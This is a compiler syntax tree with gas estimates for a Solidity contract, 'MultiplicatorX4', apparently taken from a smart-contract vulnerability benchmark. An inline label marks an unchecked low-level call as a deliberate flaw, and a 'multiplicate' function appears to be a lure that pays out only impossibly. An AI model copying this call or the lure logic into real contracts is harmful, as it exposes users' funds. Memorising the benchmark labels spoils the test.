Syntax trees:


======= /home/fabric/ArocRevision/Aroc/dataSet/smartbugs-21-7-13/unAnalyzedUlls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol =======
PragmaDirective
   Gas costs: 0
   Source: "pragma solidity ^0.4.18;"
ContractDefinition "MultiplicatorX4"
   Source: "contract MultiplicatorX4\r\n{\r\n    address public Owner = msg.sender;\r\n   \r\n    function() public payable{}\r\n   \r\n    function withdraw()\r\n    payable\r\n    public\r\n    {\r\n        require(msg.sender == Owner);\r\n        Owner.transfer(this.balance);\r\n    }\r\n    \r\n    function Command(address adr,bytes data)\r\n    payable\r\n    public\r\n    {\r\n        require(msg.sender == Owner);\r\n        // <yes> <report> UNCHECKED_LL_CALLS\r\n        adr.call.value(msg.value)(data);\r\n    }\r\n    \r\n    function multiplicate(address adr)\r\n    public\r\n    payable\r\n    {\r\n        if(msg.value>=this.balance)\r\n        {        \r\n            adr.transfer(this.balance+msg.value);\r\n        }\r\n    }\r\n}"
  VariableDeclaration "Owner"
     Type: address
     Gas costs: 335
     Source: "address public Owner = msg.sender"
    ElementaryTypeName address
       Source: "address"
    MemberAccess to member sender
       Type: address
       Source: "msg.sender"
      Identifier msg
         Type: msg
         Source: "msg"
  FunctionDefinition "" - public
     Source: "function() public payable{}"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Gas costs: 0
       Source: "{}"
  FunctionDefinition "withdraw" - public
     Source: "function withdraw()\r\n    payable\r\n    public\r\n    {\r\n        require(msg.sender == Owner);\r\n        Owner.transfer(this.balance);\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        require(msg.sender == Owner);\r\n        Owner.transfer(this.balance);\r\n    }"
      ExpressionStatement
         Gas costs: 282
         Source: "require(msg.sender == Owner)"
        FunctionCall
           Type: tuple()
           Source: "require(msg.sender == Owner)"
          Identifier require
             Type: function (bool) pure
             Source: "require"
          BinaryOperation using operator ==
             Type: bool
             Source: "msg.sender == Owner"
            MemberAccess to member sender
               Type: address
               Source: "msg.sender"
              Identifier msg
                 Type: msg
                 Source: "msg"
            Identifier Owner
               Type: address
               Source: "Owner"
      ExpressionStatement
         Gas costs: [???]
         Source: "Owner.transfer(this.balance)"
        FunctionCall
           Type: tuple()
           Source: "Owner.transfer(this.balance)"
          MemberAccess to member transfer
             Type: function (uint256)
             Source: "Owner.transfer"
            Identifier Owner
               Type: address
               Source: "Owner"
          MemberAccess to member balance
             Type: uint256
             Source: "this.balance"
            Identifier this
               Type: contract MultiplicatorX4
               Source: "this"
  FunctionDefinition "Command" - public
     Source: "function Command(address adr,bytes data)\r\n    payable\r\n    public\r\n    {\r\n        require(msg.sender == Owner);\r\n        // <yes> <report> UNCHECKED_LL_CALLS\r\n        adr.call.value(msg.value)(data);\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(address adr,bytes data)"
      VariableDeclaration "adr"
         Type: address
         Source: "address adr"
        ElementaryTypeName address
           Source: "address"
      VariableDeclaration "data"
         Type: bytes memory
         Source: "bytes data"
        ElementaryTypeName bytes
           Source: "bytes"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        require(msg.sender == Owner);\r\n        // <yes> <report> UNCHECKED_LL_CALLS\r\n        adr.call.value(msg.value)(data);\r\n    }"
      ExpressionStatement
         Gas costs: 282
         Source: "require(msg.sender == Owner)"
        FunctionCall
           Type: tuple()
           Source: "require(msg.sender == Owner)"
          Identifier require
             Type: function (bool) pure
             Source: "require"
          BinaryOperation using operator ==
             Type: bool
             Source: "msg.sender == Owner"
            MemberAccess to member sender
               Type: address
               Source: "msg.sender"
              Identifier msg
                 Type: msg
                 Source: "msg"
            Identifier Owner
               Type: address
               Source: "Owner"
      ExpressionStatement
         Gas costs: [???]
         Source: "adr.call.value(msg.value)(data)"
        FunctionCall
           Type: bool
           Source: "adr.call.value(msg.value)(data)"
          FunctionCall
             Type: function () payable returns (bool)
             Source: "adr.call.value(msg.value)"
            MemberAccess to member value
               Type: function (uint256) returns (function () payable returns (bool))
               Source: "adr.call.value"
              MemberAccess to member call
                 Type: function () payable returns (bool)
                 Source: "adr.call"
                Identifier adr
                   Type: address
                   Source: "adr"
            MemberAccess to member value
               Type: uint256
               Source: "msg.value"
              Identifier msg
                 Type: msg
                 Source: "msg"
          Identifier data
             Type: bytes memory
             Source: "data"
  FunctionDefinition "multiplicate" - public
     Source: "function multiplicate(address adr)\r\n    public\r\n    payable\r\n    {\r\n        if(msg.value>=this.balance)\r\n        {        \r\n            adr.transfer(this.balance+msg.value);\r\n        }\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "(address adr)"
      VariableDeclaration "adr"
         Type: address
         Source: "address adr"
        ElementaryTypeName address
           Source: "address"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        if(msg.value>=this.balance)\r\n        {        \r\n            adr.transfer(this.balance+msg.value);\r\n        }\r\n    }"
      IfStatement
         Source: "if(msg.value>=this.balance)\r\n        {        \r\n            adr.transfer(this.balance+msg.value);\r\n        }"
        BinaryOperation using operator >=
           Type: bool
           Gas costs: 416
           Source: "msg.value>=this.balance"
          MemberAccess to member value
             Type: uint256
             Source: "msg.value"
            Identifier msg
               Type: msg
               Source: "msg"
          MemberAccess to member balance
             Type: uint256
             Source: "this.balance"
            Identifier this
               Type: contract MultiplicatorX4
               Source: "this"
        Block
           Source: "{        \r\n            adr.transfer(this.balance+msg.value);\r\n        }"
          ExpressionStatement
             Gas costs: [???]
             Source: "adr.transfer(this.balance+msg.value)"
            FunctionCall
               Type: tuple()
               Source: "adr.transfer(this.balance+msg.value)"
              MemberAccess to member transfer
                 Type: function (uint256)
                 Source: "adr.transfer"
                Identifier adr
                   Type: address
                   Source: "adr"
              BinaryOperation using operator +
                 Type: uint256
                 Source: "this.balance+msg.value"
                MemberAccess to member balance
                   Type: uint256
                   Source: "this.balance"
                  Identifier this
                     Type: contract MultiplicatorX4
                     Source: "this"
                MemberAccess to member value
                   Type: uint256
                   Source: "msg.value"
                  Identifier msg
                     Type: msg
                     Source: "msg"
